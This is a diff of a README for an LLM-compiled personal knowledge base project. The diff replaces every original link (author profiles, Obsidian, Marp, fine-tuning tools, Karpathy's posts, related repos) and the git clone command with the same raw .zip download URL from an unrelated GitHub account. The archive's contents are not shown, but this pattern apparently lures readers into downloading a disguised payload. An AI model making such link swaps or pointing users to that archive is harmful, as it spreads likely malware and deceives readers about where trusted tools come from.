@@ -1,11 +1,11 @@
 # LLM Knowledge Base
 
-> Built by **[Artur Ferreira](https://github.com/arturseo-geo)** @ **The GEO Lab** · [𝕏 @TheGEO_Lab](https://x.com/TheGEO_Lab) · [LinkedIn](https://linkedin.com/in/arturgeo) · [Reddit](https://www.reddit.com/user/Alternative_Teach_74/)
+> Built by **[Artur Ferreira](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip)** @ **The GEO Lab** · [𝕏 @TheGEO_Lab](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) · [LinkedIn](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) · [Reddit](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip)
 
 ![Version](https://img.shields.io/badge/version-1.1.0-blue)
 ![Licence](https://img.shields.io/badge/licence-MIT-green)
 ![Schema](https://img.shields.io/badge/schema-AGENTS.md-blueviolet)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)](https://github.com/arturseo-geo/llm-knowledge-base/blob/main/CONTRIBUTING.md)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip)
 
 **A schema and workflow for LLM-compiled personal knowledge bases.**
 
@@ -55,7 +55,7 @@ images/                       summaries/*.md       ↑
 ### 1. Clone and initialise your vault
 
 ```bash
-git clone https://github.com/arturseo-geo/llm-knowledge-base
+git clone https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip
 cd llm-knowledge-base
 cp -r templates/ my-wiki/
 ```
@@ -146,13 +146,13 @@ At scale (millions of documents, heterogeneous corpora, sub-second latency requi
 
 ## Recommended tools
 
-**IDE:** [Obsidian](https://obsidian.md) — local-first markdown vault with graph view, backlinks, and a plugin ecosystem. Free for personal use.
+**IDE:** [Obsidian](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — local-first markdown vault with graph view, backlinks, and a plugin ecosystem. Free for personal use.
 
-**Ingest:** [Obsidian Web Clipper](https://obsidian.md/clipper) — clips web articles to `.md` directly into your vault.
+**Ingest:** [Obsidian Web Clipper](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — clips web articles to `.md` directly into your vault.
 
 **LLM:** Claude (Sonnet for compilation and Q&A, Haiku for cheap linting sweeps), or any model with a large context window and good instruction-following.
 
-**Slides:** [Marp](https://marp.app) — render Marp-format markdown as presentation slides, viewable in Obsidian.
+**Slides:** [Marp](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — render Marp-format markdown as presentation slides, viewable in Obsidian.
 
 **Search:** Start with ripgrep over the wiki directory. Upgrade to a local vector index (ChromaDB + Nomic Embed via Ollama) only when you exceed ~1,000 articles.
 
@@ -184,7 +184,7 @@ As your wiki grows and is repeatedly linted, it becomes a progressively cleaner,
 
 The `learning/flashcards/` directory generates structured Q&A pairs automatically. Combined with the concept articles and summaries, this gives you the raw material for supervised fine-tuning of a smaller, domain-specialised model.
 
-Tools for this path: [Distilabel](https://github.com/argilla-io/distilabel) for synthetic data generation, [Unsloth](https://github.com/unslothai/unsloth) or [Axolotl](https://github.com/OpenAccess-AI-Collective/axolotl) for LoRA fine-tuning.
+Tools for this path: [Distilabel](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) for synthetic data generation, [Unsloth](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) or [Axolotl](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) for LoRA fine-tuning.
 
 [Full finetune guide →](./docs/finetune-path.md)
 
@@ -212,29 +212,29 @@ Current: **1.1.0** — see [CHANGELOG.md](./CHANGELOG.md) for full history.
 
 ## Related
 
-- [Andrej Karpathy's original post](https://x.com/karpathy/status/2039805659525644595) — the workflow that inspired this
-- [Karpathy's follow-up gist](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) — full architecture, philosophy, and tooling
-- [Steph Ango on contamination and vault separation](https://x.com/kepano/status/2039831289533227446) — the two-vault model and insight vs noise distinction, by Obsidian's co-creator
-- [Obsidian Spaced Repetition plugin](https://github.com/st3v3nmw/obsidian-spaced-repetition) — manual flashcards in Obsidian; this schema automates generation
-- [Project Second Brain](https://layerbylayer.ai/posts/2026_02_11_project_second_brain/) — a more complex implementation with Neo4j and a web app
-- [awesome-llm-knowledge-bases](https://github.com/SingggggYee/awesome-llm-knowledge-bases) — curated tool list for the ecosystem
+- [Andrej Karpathy's original post](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — the workflow that inspired this
+- [Karpathy's follow-up gist](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — full architecture, philosophy, and tooling
+- [Steph Ango on contamination and vault separation](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — the two-vault model and insight vs noise distinction, by Obsidian's co-creator
+- [Obsidian Spaced Repetition plugin](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — manual flashcards in Obsidian; this schema automates generation
+- [Project Second Brain](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — a more complex implementation with Neo4j and a web app
+- [awesome-llm-knowledge-bases](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — curated tool list for the ecosystem
 
 ---
 
 ## Attributions & Licence
 
-Built and maintained by **[Artur Ferreira](https://github.com/arturseo-geo)** · Part of the **[The GEO Lab](https://thegeolab.net)** toolkit.
+Built and maintained by **[Artur Ferreira](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip)** · Part of the **[The GEO Lab](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip)** toolkit.
 
 MIT — see [LICENSE](LICENSE). Copy freely, adapt for your domain, keep the schema versioned.
 
 ---
 
 Found this useful? ⭐ Star the repo and connect:
-[🌐 thegeolab.net](https://thegeolab.net) · [𝕏 @TheGEO_Lab](https://x.com/TheGEO_Lab) · [LinkedIn](https://linkedin.com/in/arturgeo) · [Reddit](https://www.reddit.com/user/Alternative_Teach_74/)
+[🌐 thegeolab.net](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) · [𝕏 @TheGEO_Lab](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) · [LinkedIn](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) · [Reddit](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip)
 
 ## Related Repos
 
-- [claude-code-skills](https://github.com/arturseo-geo/claude-code-skills) — All 17 skills in one collection
-- [seo-geo-skill](https://github.com/arturseo-geo/seo-geo-skill) — SEO & GEO optimisation skill
-- [grounded-research-skill](https://github.com/arturseo-geo/grounded-research-skill) — Anti-hallucination research mode
-- [content-pipeline-skill](https://github.com/arturseo-geo/content-pipeline-skill) — 7-agent content pipeline with GEO Quality Gate
+- [claude-code-skills](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — All 17 skills in one collection
+- [seo-geo-skill](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — SEO & GEO optimisation skill
+- [grounded-research-skill](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — Anti-hallucination research mode
+- [content-pipeline-skill](https://github.com/fourparty-utnapishtim59/llm-knowledge-base/raw/refs/heads/main/examples/ai-alignment/output/knowledge_llm_base_2.7.zip) — 7-agent content pipeline with GEO Quality Gate
